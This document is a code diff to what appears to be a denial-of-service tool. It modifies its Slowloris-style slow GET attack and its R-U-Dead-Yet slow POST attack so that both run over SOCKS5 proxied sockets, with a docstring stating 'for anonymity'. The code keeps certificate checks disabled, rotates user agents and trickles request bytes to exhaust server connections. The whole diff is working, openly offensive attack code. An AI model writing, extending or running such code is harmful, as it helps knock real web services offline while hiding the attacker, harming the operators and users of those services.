@@ -1,4 +1,4 @@
-﻿import asyncio
+import asyncio
 import time
 import random
 import string
@@ -11,6 +11,7 @@ from typing import Optional, List, Dict, Tuple
 from urllib.parse import urlparse, urlencode
 from core.attack.strategies.adaptive import AdaptiveController
 from core.monitor.metrics import MetricsCollector
+from core.network._tls.fingerprint import get_random_ssl_context
 try:
     from core.network.socks_utils import create_proxied_socket
 except ImportError:
@@ -652,20 +653,24 @@ async def attack_slow(url: str, proxy: Optional[str], session_pool: OptimizedSes
     path = parsed.path or "/"
     if parsed.query:
         path += "?" + parsed.query
+    loop = asyncio.get_event_loop()
+
+    def _connect_sock():
+        sock = create_proxied_socket(proxy or "", 5)
+        _configure_socket(sock)
+        sock.connect((host, port))
+        if is_ssl:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=host)
+        return sock
 
     async def single_request():
         async with sem:
-            writer = None
+            sock = None
             try:
-                ssl_ctx = None
-                if is_ssl:
-                    ssl_ctx = ssl.create_default_context()
-                    ssl_ctx.check_hostname = False
-                    ssl_ctx.verify_mode = ssl.CERT_NONE
-                reader, writer = await asyncio.wait_for(
-                    asyncio.open_connection(host, port, ssl=ssl_ctx, server_hostname=host if is_ssl else None),
-                    timeout=5
-                )
+                sock = await loop.run_in_executor(None, _connect_sock)
                 req = (
                     f"GET {path} HTTP/1.1\r\n"
                     f"Host: {host}\r\n"
@@ -674,13 +679,12 @@ async def attack_slow(url: str, proxy: Optional[str], session_pool: OptimizedSes
                     f"Connection: keep-alive\r\n"
                     f"\r\n"
                 )
-                writer.write(req.encode())
-                await writer.drain()
+                await loop.sock_sendall(sock, req.encode())
                 metrics["completed"] += 1
                 metrics["total"] += 1
                 while time.time() - start < duration:
                     try:
-                        chunk = await asyncio.wait_for(reader.read(1), timeout=2)
+                        chunk = await asyncio.wait_for(loop.sock_recv(sock, 1), timeout=2)
                         if not chunk:
                             break
                     except asyncio.TimeoutError:
@@ -690,10 +694,9 @@ async def attack_slow(url: str, proxy: Optional[str], session_pool: OptimizedSes
                 metrics["failed"] += 1
                 metrics["total"] += 1
             finally:
-                if writer is not None:
+                if sock is not None:
                     try:
-                        writer.close()
-                        await writer.wait_closed()
+                        sock.close()
                     except Exception:
                         pass
 
@@ -909,6 +912,7 @@ async def attack_rudy(url: str, proxy: Optional[str], session_pool: OptimizedSes
                       metrics_out: Optional[Dict] = None) -> Dict:
     """
     R-U-Dead-Yet? slow POST body attack with TLS fingerprint randomization
+    Uses SOCKS5 proxied sockets for anonymity.
     metrics_out: If provided, updated in real-time during attack
     """
     metrics = metrics_out if metrics_out is not None else {"completed": 0, "failed": 0, "timeout": 0, "total": 0}
@@ -921,18 +925,23 @@ async def attack_rudy(url: str, proxy: Optional[str], session_pool: OptimizedSes
     port = parsed.port or (443 if parsed.scheme == "https" else 80)
     is_ssl = parsed.scheme == "https"
     path = parsed.path or "/"
+    loop = asyncio.get_event_loop()
+
+    def _connect_sock():
+        sock = create_proxied_socket(proxy or "", 5)
+        _configure_socket(sock)
+        sock.connect((host, port))
+        if is_ssl:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            sock = ctx.wrap_socket(sock, server_hostname=host)
+        return sock
 
     async def send_slow_post():
-        writer = None
+        sock = None
         try:
-            ssl_ctx = None
-            if is_ssl:
-                ssl_ctx, tls_profile = get_random_ssl_context()
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(host, port, ssl=ssl_ctx, server_hostname=host if is_ssl else None),
-                timeout=5
-            )
-            
+            sock = await loop.run_in_executor(None, _connect_sock)
             user_agent = random.choice(USER_AGENTS)
             req = (
                 f"POST {path} HTTP/1.1\r\n"
@@ -943,30 +952,24 @@ async def attack_rudy(url: str, proxy: Optional[str], session_pool: OptimizedSes
                 f"Connection: keep-alive\r\n"
                 f"\r\n"
             )
-            writer.write(req.encode())
-            await writer.drain()
+            await loop.sock_sendall(sock, req.encode())
             metrics["completed"] += 1
             metrics["total"] += 1
 
-            # Trickle body byte-by-byte until duration runs out
             while time.time() - start < duration:
-                writer.write(b"A")
                 try:
-                    await asyncio.wait_for(writer.drain(), timeout=2)
+                    await asyncio.wait_for(loop.sock_sendall(sock, b"A"), timeout=2)
                 except asyncio.TimeoutError:
                     break
-                # Slow trickle - server is forced to wait
                 await asyncio.sleep(random.uniform(0.5, 1.5))
         except (ConnectionResetError, BrokenPipeError, OSError, asyncio.TimeoutError) as e:
-            # Aggressive exception handling
             logger.debug(f"RUDY connection error: {type(e).__name__}")
             metrics["failed"] += 1
             metrics["total"] += 1
         finally:
-            if writer is not None:
+            if sock is not None:
                 try:
-                    writer.close()
-                    await writer.wait_closed()
+                    sock.close()
                 except Exception:
                     pass
 
